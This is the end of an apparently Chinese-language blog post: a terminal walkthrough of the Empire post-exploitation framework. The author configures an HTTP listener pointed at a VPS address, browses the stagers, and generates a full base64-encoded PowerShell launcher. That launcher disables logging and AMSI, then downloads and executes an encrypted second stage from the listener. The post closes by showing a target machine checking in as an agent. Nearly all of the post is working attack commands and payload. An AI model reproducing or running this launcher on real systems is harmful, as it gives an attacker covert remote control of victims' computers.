<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#端口映射参考上条</span></div><div class="line">================================================================</div><div class="line"> [Empire]  Post-Exploitation Framework</div><div class="line">================================================================</div><div class="line"> [Version] 2.3 | [Web] https://github.com/empireProject/Empire</div><div class="line">================================================================</div><div class="line"></div><div class="line">   _______ .___  ___. .______    __  .______       _______</div><div class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</div><div class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</div><div class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</div><div class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</div><div class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</div><div class="line"></div><div class="line"></div><div class="line">       282 modules currently loaded</div><div class="line"></div><div class="line">       0 listeners currently active</div><div class="line"></div><div class="line">       0 agents currently active</div><div class="line"></div><div class="line"></div><div class="line">(Empire) &gt; <span class="built_in">help</span></div><div class="line"></div><div class="line">Commands</div><div class="line">========</div><div class="line">agents            Jump to the Agents menu.</div><div class="line">creds             Add/display credentials to/from the database.</div><div class="line"><span class="built_in">exit</span>              Exit Empire</div><div class="line"><span class="built_in">help</span>              Displays the <span class="built_in">help</span> menu.</div><div class="line">interact          Interact with a particular agent.</div><div class="line">list              Lists active agents or listeners.</div><div class="line">listeners         Interact with active listeners.</div><div class="line">load              Loads Empire modules from a non-standard folder.</div><div class="line">preobfuscate      Preobfuscate PowerShell module_source files</div><div class="line">reload            Reload one (or all) Empire modules.</div><div class="line">reset             Reset a global option (e.g. IP whitelists).</div><div class="line">resource          Read and execute a list of Empire commands from a file.</div><div class="line">searchmodule      Search Empire module names/descriptions.</div><div class="line"><span class="built_in">set</span>               Set a global option (e.g. IP whitelists).</div><div class="line">show              Show a global option (e.g. IP whitelists).</div><div class="line">usemodule         Use an Empire module.</div><div class="line">usestager         Use an Empire stager.</div><div class="line"></div><div class="line">(Empire) &gt; list</div><div class="line">(Empire) &gt; listeners</div><div class="line">[!] No listeners currently active</div><div class="line">(Empire: listeners) &gt; uselistener http</div><div class="line">(Empire: listeners/http) &gt; info</div><div class="line"></div><div class="line">    Name: HTTP[S]</div><div class="line">Category: client_server</div><div class="line"></div><div class="line">Authors:</div><div class="line">  @harmj0y</div><div class="line"></div><div class="line">Description:</div><div class="line">  Starts a http[s] listener (PowerShell or Python) that uses a</div><div class="line">  GET/POST approach.</div><div class="line"></div><div class="line">HTTP[S] Options:</div><div class="line"></div><div class="line">  Name              Required    Value                            Description</div><div class="line">  ----              --------    -------                          -----------</div><div class="line">  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.</div><div class="line">  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use <span class="keyword">for</span> request (default, none, or other).</div><div class="line">  KillDate          False                                        Date <span class="keyword">for</span> the listener to <span class="built_in">exit</span> (MM/dd/yyyy).</div><div class="line">  Name              True        http                             Name <span class="keyword">for</span> the listener.</div><div class="line">  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.</div><div class="line">  DefaultDelay      True        5                                Agent delay/reach back interval (<span class="keyword">in</span> seconds).</div><div class="line">  DefaultLostLimit  True        60                               Number of missed checkins before exiting</div><div class="line">  WorkingHours      False                                        Hours <span class="keyword">for</span> the agent to operate (09:00-17:00).</div><div class="line">  SlackChannel      False       <span class="comment">#general                         The Slack channel or DM that notifications will be sent to.</span></div><div class="line">  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile <span class="keyword">for</span> the agent.</div><div class="line">                                process.php|Mozilla/5.0 (Windows</div><div class="line">                                NT 6.1; WOW64; Trident/7.0;</div><div class="line">                                rv:11.0) like Gecko</div><div class="line">  Host              True        http://172.17.0.2:80             Hostname/IP <span class="keyword">for</span> staging.</div><div class="line">  CertPath          False                                        Certificate path <span class="keyword">for</span> https listeners.</div><div class="line">  DefaultJitter     True        0.0                              Jitter <span class="keyword">in</span> agent reachback interval (0.0-1.0).</div><div class="line">  Proxy             False       default                          Proxy to use <span class="keyword">for</span> request (default, none, or other).</div><div class="line">  UserAgent         False       default                          User-agent string to use <span class="keyword">for</span> the staging request (default, none, or other).</div><div class="line">  StagingKey        True        3ab47284cf7e260541d810beb54d3405 Staging key <span class="keyword">for</span> initial agent negotiation.</div><div class="line">  BindIP            True        0.0.0.0                          The IP to <span class="built_in">bind</span> to on the control server.</div><div class="line">  Port              True        80                               Port <span class="keyword">for</span> the listener.</div><div class="line">  ServerVersion     True        Microsoft-IIS/7.5                Server header <span class="keyword">for</span> the control server.</div><div class="line">  StagerURI         False                                        URI <span class="keyword">for</span> the stager. Must use /download/. Example: /download/stager.php</div><div class="line"></div><div class="line"></div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Name docker</div><div class="line"><span class="comment">#此处的172.16.188.1为vps的ip地址</span></div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host http://172.16.188.1:5000</div><div class="line">(Empire: listeners/http) &gt; execute</div><div class="line">[*] Starting listener <span class="string">'docker'</span></div><div class="line">[+] Listener successfully started!</div><div class="line">(Empire: listeners/http) &gt; lsit</div><div class="line">*** Unknown syntax: lsit</div><div class="line">(Empire: listeners/http) &gt; back</div><div class="line">(Empire: listeners) &gt; list</div><div class="line"></div><div class="line">[*] Active listeners:</div><div class="line"></div><div class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</div><div class="line">  ----              ------          ----                                 ------------   --------</div><div class="line">  docker            http            http://172.16.188.1:5000             5/0.0</div><div class="line"></div><div class="line">(Empire: listeners) &gt; usestager</div><div class="line">multi/bash                osx/dylib                 osx/teensy                windows/launcher_sct</div><div class="line">multi/launcher            osx/jar                   windows/bunny             windows/launcher_vbs</div><div class="line">multi/pyinstaller         osx/launcher              windows/dll               windows/macro</div><div class="line">multi/war                 osx/macho                 windows/ducky             windows/macroless_msword</div><div class="line">osx/applescript           osx/macro                 windows/hta               windows/teensy</div><div class="line">osx/application           osx/pkg                   windows/launcher_bat</div><div class="line">osx/ducky                 osx/safari_launcher       windows/launcher_lnk</div><div class="line">(Empire: listeners) &gt; usestager windows/d</div><div class="line">dll    ducky</div><div class="line">(Empire: listeners) &gt; usestager windows/dll</div><div class="line">(Empire: stager/windows/dll) &gt; info</div><div class="line"></div><div class="line">Name: DLL Launcher</div><div class="line"></div><div class="line">Description:</div><div class="line">  Generate a PowerPick Reflective DLL to inject with</div><div class="line">  stager code.</div><div class="line"></div><div class="line">Options:</div><div class="line"></div><div class="line">  Name             Required    Value             Description</div><div class="line">  ----             --------    -------           -----------</div><div class="line">  Listener         True                          Listener to use.</div><div class="line">  ProxyCreds       False       default           Proxy credentials</div><div class="line">                                                 ([domain\]username:password) to use <span class="keyword">for</span></div><div class="line">                                                 request (default, none, or other).</div><div class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</div><div class="line">                                                 powershell code, uses the</div><div class="line">                                                 ObfuscateCommand <span class="keyword">for</span> obfuscation types.</div><div class="line">                                                 For powershell only.</div><div class="line">  Proxy            False       default           Proxy to use <span class="keyword">for</span> request (default, none,</div><div class="line">                                                 or other).</div><div class="line">  Language         True        powershell        Language of the stager to generate.</div><div class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</div><div class="line">  UserAgent        False       default           User-agent string to use <span class="keyword">for</span> the staging</div><div class="line">                                                 request (default, none, or other).</div><div class="line">  Arch             True        x64               Architecture of the .dll to generate</div><div class="line">                                                 (x64 or x86).</div><div class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation <span class="built_in">command</span> to use.</div><div class="line">                                                 Only used <span class="keyword">if</span> Obfuscate switch is True.</div><div class="line">                                                 For powershell only.</div><div class="line">  StagerRetries    False       0                 Times <span class="keyword">for</span> the stager to retry</div><div class="line">                                                 connecting.</div><div class="line"></div><div class="line"></div><div class="line">(Empire: stager/windows/dll) &gt; <span class="built_in">set</span> Listener docker</div><div class="line">(Empire: stager/windows/dll) &gt; back</div><div class="line">(Empire: listeners) &gt; launcher powershell docker</div><div class="line">powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBpAE8A<span class="built_in">bg</span>BUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkA<span class="built_in">bg</span>BnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkA<span class="built_in">bg</span>BnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkA<span class="built_in">bg</span>B2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkA<span class="built_in">bg</span>BHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEA<span class="built_in">bg</span>BhAGcAZQBtAGUA<span class="built_in">bg</span>B0AC4AQQB1AHQAbwBtAGEAdABpAG8A<span class="built_in">bg</span>AuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8A<span class="built_in">bg</span>BQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQA<span class="built_in">bg</span>B1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8A<span class="built_in">bg</span>B0AGkA<span class="built_in">bg</span>BVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUA<span class="built_in">bg</span>BUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUA<span class="built_in">bg</span>B0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUA<span class="built_in">bg</span>B0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIA<span class="built_in">bg</span>BwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==</div><div class="line"><span class="comment">#在目标机器上执行上面的payload就可以得到下面的反弹</span></div><div class="line">(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)</div></pre></td></tr></table></figure>

  </section>

  <section class="post-comments">

    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
    
</section>


</article>


            <footer class="footer">

    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
    
</footer>
        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>


    

    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    
    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
